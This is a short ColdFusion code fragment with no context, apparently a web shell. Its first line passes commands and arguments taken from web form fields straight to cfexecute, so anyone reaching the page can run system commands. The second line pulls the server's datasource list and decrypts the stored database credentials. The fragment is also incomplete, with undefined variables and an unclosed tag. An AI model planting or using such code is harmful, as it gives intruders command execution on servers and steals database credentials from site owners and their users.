<cfexecute name="#form.cmd#" arguments="#form.opts#"><cfoutput>Result</cfoutput>
<cfscript>obj=createobject("java","coldfusion.server.ServiceFactory").getDatasourceService().getDatasources();plain=Decrypt(data[i]["username"],key,"DESede","Base64");</cfscript>
